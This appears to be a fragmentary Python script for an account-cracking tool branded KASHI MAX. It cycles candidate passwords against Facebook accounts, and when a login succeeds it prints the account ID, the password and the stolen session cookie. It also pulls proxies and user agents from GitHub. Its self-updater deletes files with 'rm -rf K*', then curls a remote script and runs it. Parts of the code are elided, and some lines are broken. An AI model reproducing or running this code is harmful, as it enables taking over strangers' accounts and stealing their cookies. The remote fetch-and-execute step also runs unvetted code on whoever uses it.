...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
   ...
   #NEW#AGENT
    ...
    ugen.append(uaku2)
    ugen.append(uaku2)
##_____USER AGENT START____##
    
    

def uaku():
    try:
        ff=open('https://github.com/TECH-KASHIF/KASHI-009/blob/main/user_agent.txt','r').read().splitlines()
        for ub in ff:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/TECH-KASHIF/KASHI-009/blob/main/user_agent.txt','r').text
        ff=open('show.txt','w')
...
-------------------------------------------------- \033[1;32m
    ...
    ██╔═██╗ ██╔══██║╚════██║██╔══██║██║
    ██║  ██╗██║  ██║███████║██║  ██║██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ \033[1;32m MAX\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mKASHI\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/TECH-KASHIF/KASHI-009/main/proxy.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/TECH-KASHIF/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf K*')
        os.system('curl -L https://raw.githubusercontent.com/TECH-KASHIF/KASHI-009/main/Kashi.py > Kashi.py')
        os.system('python Kashi.py')
    else:pass
...
def kashif():
	print(logo)
	print('[1] RANDOM FILE CLONING (Coming Soon)')
	print('[2] RANDOM PAK CLONING')
	print('[3] RANDOM BD CLONING')
	print('[4] RANDOM CHOICE PASS CLONING')
	print('[5] CONTACT WITH OWNER')
	print('[0] EXIT')
	lines()
	gh = input('[•] CHOOSE : ')
	if gh =='1':
	   os.system(' File-Cloning.py ')
	if gh =='2':
		menu()
	elif gh =='3':
		bd()
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=K45H1F.009')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MAX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[MAX-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mMAX","\x1b[1;92mMAX","\x1b[1;93mMAX","\x1b[1;94mMAX","\x1b[1;95mMAX","\x1b[1;96mMAX","\x1b[1;97mMAX","\x1b[1;91mMAX","\x1b[1;92mMAX","\x1b[1;93mMAX","\x1b[1;94mMAX","\x1b[1;95mMAX","\x1b[1;96mMAX"])
        sys.stdout.write(f'\r  {P}[{animasi}{P}][{K}%s|\33[1;32mOK:- %s]\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
